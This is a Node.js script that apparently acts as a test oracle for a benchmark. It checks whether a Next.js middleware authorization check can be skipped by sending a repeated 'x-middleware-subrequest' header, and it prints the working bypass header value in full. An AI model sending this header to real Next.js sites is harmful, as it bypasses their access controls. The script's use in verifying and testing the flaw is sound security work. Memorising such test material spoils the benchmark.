const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function emit() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const marker = path.join(os.tmpdir(), 'next-cve-authz-' + Date.now() + '-' + Math.random().toString(16).slice(2));
  fs.mkdirSync(marker, { recursive: true });

  let getMiddlewareRouteMatcher;
  let NextURL;
  try {
    ({ getMiddlewareRouteMatcher } = require('next/dist/shared/lib/router/utils/middleware-route-matcher'));
    ({ NextURL } = require('next/dist/server/web/next-url'));
  } catch (e) {
    evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (typeof getMiddlewareRouteMatcher !== 'function' || typeof NextURL !== 'function') {
    evidence = 'missing_required_exports';
    emit();
    return;
  }

  const matcher = getMiddlewareRouteMatcher([
    { regexp: '^/protected(?:/.*)?$', originalSource: '/protected/:path*' }
  ]);

  const base = 'http://localhost:3000';

  function makeReq(pathname, subrequestHeader) {
    const hdr = {};
    if (subrequestHeader !== undefined) hdr['x-middleware-subrequest'] = subrequestHeader;
    return {
      nextUrl: new NextURL(pathname, { headers: hdr, nextConfig: {} }),
      headers: hdr,
      url: base + pathname,
      method: 'GET'
    };
  }

  let benign;
  try {
    benign = matcher(makeReq('/protected/dashboard'), {});
  } catch (e) {
    evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
    emit();
    return;
  }

  if (benign !== true) {
    evidence = 'benign_failed:' + String(benign);
    emit();
    return;
  }

  operation_completed = true;

  try {
    const attackHeader = 'middleware:middleware:middleware:middleware:middleware';
    const attacked = matcher(makeReq('/protected/dashboard', attackHeader), {});
    exploit_succeeded = attacked === false;
    evidence = 'benign=' + String(benign) + '|attack=' + String(attacked) + '|header=' + attackHeader;
    fs.writeFileSync(path.join(marker, 'evidence.txt'), evidence);
  } catch (e) {
    exploit_succeeded = false;
    evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
  }

  emit();
} catch (e) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
  emit();
}